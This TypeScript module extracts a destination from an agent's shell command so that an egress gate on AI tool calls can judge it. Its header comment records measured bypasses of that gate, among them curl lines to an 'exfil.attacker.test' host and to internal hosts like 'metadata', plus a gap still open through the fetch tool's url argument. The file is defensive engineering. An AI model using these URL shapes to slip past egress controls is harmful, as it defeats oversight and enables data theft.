/**
 * The Guardian's destination extractor: what stands between an ACS
 * `raw_command` and AGT's stock egress gate.
 *
 * NOT the gate. `policy/lib/egress.rego` is the gate, `cfg.egress` is its
 * configuration, `egress_destination_not_allowed` is the reason it emits, and
 * every one of those is AGT's, vendored byte-identical and not authored here.
 * This module supplies one of that gate's own declared inputs -- the
 * destination path `["annotations", "egress", "destination"]`, one of the five
 * that `default_destination_paths` declares, which is to say AGT anticipated
 * exactly this seam and published the address for it.
 *
 * WHY EXTRACTION RATHER THAN FORWARDING. `host_of()` has two branches, and
 * both of them answer something for a whole command line. When the string
 * contains "://" it takes everything after the scheme, so a URL bounded by a
 * "/" survives being embedded in a command: measured, `curl
 * https://evil.test/x` answers `evil.test`. That is the case that works, and
 * it is the only one. When the string contains no "://" the second branch
 * returns the command's own leading word -- measured, `echo hi` answers
 * `echo hi` and `ls -la /tmp` answers `ls -la ` -- so a forwarded command
 * line always resolves a destination, and no allowlist pattern matches a
 * command, so every benign shell step would be denied. And when nothing
 * bounds the host on the right, trailing shell text is swallowed into it:
 * `curl https://docs.anthropic.com; ls` answers `docs.anthropic.com; ls`,
 * which turns an allowlisted destination into a denial. Extracting the URL
 * first is what keeps the gate from deciding about strings that are not
 * destinations at all.
 *
 * WHY THE GATE IS HANDED AN ORIGIN RATHER THAN THE URL AS MATCHED.
 * `host_of()` takes the substring after the scheme, splits it on "/", takes
 * index 0, splits THAT on ":" and takes index 0 again. That is not a URL parse,
 * and three separate shapes get past it -- all three measured against the
 * shipped allowlist, through a Guardian started from this tree, with the URL
 * handed over as matched:
 *
 *   curl https://docs.anthropic.com:pw@exfil.attacker.test/steal   ALLOWED
 *   curl https://metadata?x=@docs.anthropic.com                    ALLOWED
 *   curl https://internal-api#@docs.anthropic.com                  ALLOWED
 *
 * The first is a userinfo carrying a ":": the split at that ":" answers
 * `docs.anthropic.com`, which `*.anthropic.com` covers. The second and third
 * need no userinfo at all -- an authority ends at the first of "/", "?" or "#",
 * `host_of()` bounds only at "/", so the query or fragment text joins the
 * "host", and the allowlist glob's "*" swallows it whenever the real host has
 * NO DOT IN IT. That last condition is what turns a parsing nit into a bypass:
 * dotless names are internal ones -- `metadata`, `internal-api` -- which is
 * exactly the class an egress gate is deployed for. `curl` reaches `metadata`
 * and `internal-api` for those two (measured with `curl -w '%{url.host}'`).
 *
 * So this module hands over `new URL(...).origin`, not the matched text. An
 * origin is scheme, host and port and nothing else: it CANNOT carry a userinfo,
 * a query or a fragment, so every shape above collapses to the host the request
 * actually reaches, and `host_of()`'s remaining job -- split the port off -- is
 * one it does correctly. Measured, all three deny after the change.
 *
 * THREE HAND-ROLLED NORMALISERS PRECEDED THIS ONE, AND EACH LEAKED A DIFFERENT
 * SHAPE. The first handed the URL over as matched; the second stripped userinfo
 * but bounded the authority at "/" alone, which re-opened the class on
 * query-delimited and fragment-delimited authorities; the third bounded at "/",
 * "?" and "#" and still left the dotless-host shape, because that one is not
 * about the bound at all. Three rounds, three shapes: the defect was hand-
 * rolling the parse, so the parse is no longer hand-rolled. Do not reintroduce
 * a bespoke normaliser beside this one -- two answers to "what is the host"
 * is the same two-declarations-of-one-fact hazard the policy-target argument
 * table exists to remove.
 *
 * WHAT AN ORIGIN DROPS, AND WHY IT COSTS NOTHING HERE. The path, query and
 * fragment go. The gate consults only `host_of(dest)`, so today none of them
 * was ever read, and the message AGT emits names a host either way. The one
 * deployment this would matter to is one that pointed
 * `cfg.egress.destination_paths` at a rule expecting a whole URL at this
 * address -- a path this repository does not ship and a change that would have
 * to be made deliberately.
 *
 * TWO EFFECTS IN THE PERMISSIVE DIRECTION, BOTH MEASURED AND BOTH RECORDED
 * RATHER THAN DISCOVERED LATER. `new URL` lowercases the host, and the
 * allowlist glob is case-sensitive, so `curl https://DOCS.ANTHROPIC.COM/x`
 * denied before this change and allows after it. That is correct -- DNS is
 * case-insensitive and the request reaches the allowlisted host either way --
 * but it is a widening, and it is stated as one. `curl https://EVIL.TEST/x`
 * still denies, and so does `curl https://docs.anthropic.com.evil.test/x`.
 *
 * THIS IS A CORRECTION TO THE STRING THIS MODULE CHOOSES TO SUPPLY, NOT TO THE
 * GATE. The same misreadings are still live on the path that does not come
 * through here: a fetch tool's own `url` argument is the gate's FIRST declared
 * destination path, read by `host_of()` directly with nothing in between, so
 * `WebFetch` of the colon-bearing URL above is still allowed. Closing that
 * would mean editing `policy/lib/egress.rego`, which is AGT's file, held
 * byte-identical by `bun run verify:pin`. It is recorded as a measured
 * limitation instead -- see the runbook section on what this does not catch.
 *
 * WHY IT READS THE PRELIMINARY DOCUMENT ITSELF. A manifest's
 * `annotations.<name>.from` is a liveness precondition, not a projection: the
 * SDK requires the path to resolve (an unresolvable one denies the whole call
 * on runtime_error:path_missing, before this function is called at all) and
 * then hands the dispatcher the entire preliminary policy input rather than
 * the value it resolved. Measured. So the command is read here, from the
 * snapshot, by name.
 */

/**
 * The tool-argument names AGT's own gate already reads a destination out of --
 * `default_destination_paths` in `policy/lib/egress.rego`, minus the
 * annotation path this module writes.
 *
 * When one of them is already a string on the snapshot, this module answers
 * nothing. `destination(rules)` is a COMPLETE Rego rule over every configured
 * path, so two paths resolving to different strings has no single answer:
 * measured, that is `deny runtime_error:policy_invocation_failed` -- a total
 * deny wearing a runtime-error reason, on a call nobody decided about. The
 * tool's own argument is the better evidence anyway: it is what the tool will
 * actually reach for, where a command line is what someone typed.
 *
 * The coupling is a copy, and it is only correct while the gate runs on its
 * defaults: `cfg.egress.destination_paths` replaces `default_destination_paths`
 * outright rather than extending it, so a deployment that sets that key
 * desynchronises this list in whichever direction it moved -- a path it adds is
 * one this module will not stand down for, and a path it drops is one this
 * module stands down for needlessly. The shipped `policy/lib/data.json` sets no
 * such key. A deployment that sets one has to revisit this list.
 */
const ARGUMENTS_AGT_ALREADY_READS = ["url", "endpoint", "host", "domain"] as const;

/**
 * The first absolute http(s) URL in a command line.
 *
 * Scheme-anchored on purpose. A bare-host pattern would match package names,
 * file paths and flag values, and every false positive here becomes a denial
 * of a step nobody meant to govern. The character class ends the match at
 * whitespace and at the shell metacharacters that end a word, so a trailing
 * `; ls` or `| tee` is not swallowed into the host.
 *
 * First match, not every match: the gate takes one destination. A command
 * reaching two hosts has its first examined and the rest unexamined, which is
 * this module's stated miss direction rather than a hidden one.
 */
const DESTINATION_IN_COMMAND = /\bhttps?:\/\/[^\s'"`;|&()<>]+/;

function isPlainObject(value: unknown): value is Record<string, unknown> {
  return typeof value === "object" && value !== null && !Array.isArray(value);
}

/**
 * Answers `{destination}` when it finds one, `{}` when it does not. The
 * destination is the matched URL's ORIGIN -- scheme, host and port -- not the
 * matched text; see the module header for the three measured shapes that makes
 * the difference between a denial and an allow.
 *
 * Never a throw and never `null`, and both halves are load-bearing. AGT turns
 * any annotator failure -- thrown or rejected -- into its own
 * `runtime_error:annotation_failed` deny, which lands on EVERY call in the
 * deployment, benign ones included, and reads like a policy decision. And a
 * command with no destination is not a failure: the gate is `undefined` when
 * nothing resolves, and the call falls through to the other gates. So an
 * obfuscated or novel egress form is UNEXAMINED here, not denied -- the
 * failure direction the runbook states plainly, because the demo's shape
 * invites the opposite reading.
 *
 * `name` and `config` are part of the dispatcher contract and are not read:
 * this function is the one annotator this Guardian has, and routing by name is
 * its caller's job.
 */
export function annotateEgressDestination(_name: string, _config: unknown, preliminary: unknown): unknown {
  if (!isPlainObject(preliminary)) return {};
  const snapshot = preliminary.snapshot;
  if (!isPlainObject(snapshot)) return {};
  const toolCall = snapshot.tool_call;
  if (!isPlainObject(toolCall)) return {};

  const args = isPlainObject(toolCall.args) ? toolCall.args : {};
  for (const argument of ARGUMENTS_AGT_ALREADY_READS) {
    if (typeof args[argument] === "string") return {};
  }

  const rawCommand = toolCall.raw_command;
  if (typeof rawCommand !== "string") return {};

  const found = DESTINATION_IN_COMMAND.exec(rawCommand);
  if (found === null) return {};

  // `new URL` throws on input it cannot parse, and this function may not: a
  // throw here becomes AGT's own `runtime_error:annotation_failed` deny on
  // every call in the deployment. So an unparseable match is answered the same
  // way a command with no URL in it is -- `{}`, no destination, unexamined
  // rather than denied. The regex is scheme-anchored, so a match always carries
  // one, and the catch is for the shapes a scheme alone does not make valid.
  let parsed: URL;
  try {
    parsed = new URL(found[0]);
  } catch {
    return {};
  }
  return { destination: parsed.origin };
}
